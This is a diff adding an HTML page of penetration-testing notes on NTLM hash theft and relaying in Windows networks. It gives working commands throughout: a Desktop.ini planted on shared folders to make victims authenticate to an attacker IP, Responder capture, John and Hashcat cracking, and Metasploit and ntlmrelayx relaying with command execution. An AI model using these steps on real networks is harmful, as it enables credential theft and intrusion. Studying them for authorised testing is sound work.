@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>NTLM Relaying and Theft - Notes</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "TLDR", url: "#_top", children: [
+          ]},
+          {title: "Background", url: "#background", children: [
+              {title: "Desktop.ini files", url: "#desktopini-files" },
+              {title: "Capture Challenge Response and Crack the Hash", url: "#capture-challenge-response-and-crack-the-hash" },
+              {title: "Cracking the Hash", url: "#cracking-the-hash" },
+          ]},
+          {title: "Relaying", url: "#relaying", children: [
+          ]},
+          {title: "Recommendation", url: "#recommendation", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../credential_extraction/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../credential_extraction/" class="btn btn-xs btn-link">
+        Credential Extraction (LSASS/SAM)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../smb_shares_mining/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../smb_shares_mining/" class="btn btn-xs btn-link">
+        SMB Shares Mining
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="tldr">TLDR<a class="headerlink" href="#tldr" title="Permanent link">#</a></h2>
+<h2 id="background">Background<a class="headerlink" href="#background" title="Permanent link">#</a></h2>
+<p>Goal: Steal  NTLM-hash or a challenge-response handshake.<br />
+Goal: Perform a relay attack to authenticate against a server.  </p>
+<p>There are many ways to trick computers into sending the authenticated user's NTLM hashes. </p>
+<h3 id="desktopini-files">Desktop.ini files<a class="headerlink" href="#desktopini-files" title="Permanent link">#</a></h3>
+<p>Find a commonly used share where your user has write permissions. See <a href="../../active_directory_privilege_escalation/smb_shares_mining">SMB Shares Mining</a> for how to find writable shares. The folder cannot be the root-folder of the share. So if you have write-access to the root of the share you can just create a folder there.</p>
+<p>Name the folder <code>0Dcouments</code> or something like that. If the folder that is writable contains many folders the folder lower down won't be "rendered" until the user scrolls down. So naming you folder somthing with a <code>0</code> garantes that it will be rendered early.</p>
+<p>Create <code>desktop.ini</code> file on an SMB-share used by other users. Viewing the share in explorer will cause a
+request for a resource, allowing the capture or relay of NTLM-challenge responses.</p>
+<p>Filename: Desktop.ini</p>
+<pre><code>[.ShellClassInfo]
+IconFile=\\10.13.37.100\test\test.ico
+IconIndex=0
+</code></pre>
+
+<p>The folder in which the Desktop.ini file in needs to be configured with the system flag.</p>
+<pre><code>attrib +s &lt;path-to-folder&gt;
+</code></pre>
+
+<p>We need to now also set desktop.ini to be hidden and system before windows will respect it.</p>
+<pre><code>attrib +s +h desktop.ini
+</code></pre>
+
+<p>Placing this on a commonly visited network share, will trick the victim's computer into 
+authenticating towards the specified IP. This can be used in NTLM-relaying attacks, or
+to steal the challenge-response and run hashcat on it</p>
+<h3 id="capture-challenge-response-and-crack-the-hash">Capture Challenge Response and Crack the Hash<a class="headerlink" href="#capture-challenge-response-and-crack-the-hash" title="Permanent link">#</a></h3>
+<p>When the victim enters the share the victim machine will try to authenticate to your attacker-machine, and using responder we can retreive the NTLM hash of the victim.</p>
+<p><strong> IMPORTANT DO NOT RUN RESPONDER WITHOUT the <code>-A</code> flag unless you know what you are doing </strong><br />
+It will poison and other suff. <code>-A</code> will make it passive, analyzing mode.</p>
+<pre><code>responder -v -A -I eth0
+</code></pre>
+
+<p>Now once responder has recorded the challenge/response it is stored in a logfile found here (on kali):</p>
+<pre><code>/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.66.10.txt
+</code></pre>
+
+<p>If you don't want to use responder you can use tcpdump, and the use <code>pcredz</code>. It will find the authentications that are used. Not sure how well it works with challenge-response though.</p>
+<h3 id="cracking-the-hash">Cracking the Hash<a class="headerlink" href="#cracking-the-hash" title="Permanent link">#</a></h3>
+<p>With John:  </p>
+<pre><code>john SMB-NTLMv2-SSP-192.168.66.10.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+
+<p>With Hashcat:</p>
+<pre><code>hashcat -m 5600 -a 3 --force /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.66.10.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+
+<h2 id="relaying">Relaying<a class="headerlink" href="#relaying" title="Permanent link">#</a></h2>
+<p><strong>Metasploit</strong></p>
+<pre><code>use windows/smb/smb_relay
+
+
+# SMBHOST  192.168.66.88    no        The target SMB server (leave empty for originating system)
+
+set SMBHOST &lt;ANY host that you think the user has Admin access to&gt;
+
+# Set the payload you want
+</code></pre>
+
+<p>The authentication actually worked but I got no shell when I tested it. Not sure why.</p>
+<p><strong>Impacket</strong></p>
+<p>The same thing can be done with impacket.</p>
+<p>If no command is entered the default behaviour is to dump all the users hashes if the authenticated user is an administrator of course.</p>
+<pre><code>sudo ./ntlmrelayx.py -t 192.168.66.88 -c whoami
+</code></pre>
+
+<h2 id="recommendation">Recommendation<a class="headerlink" href="#recommendation" title="Permanent link">#</a></h2>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../credential_extraction/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../credential_extraction/" class="btn btn-xs btn-link">
+        Credential Extraction (LSASS/SAM)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../smb_shares_mining/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../smb_shares_mining/" class="btn btn-xs btn-link">
+        SMB Shares Mining
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_active_directory_domain/active_directory_privilege_escalation/ntlm_relaying_and_theft.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
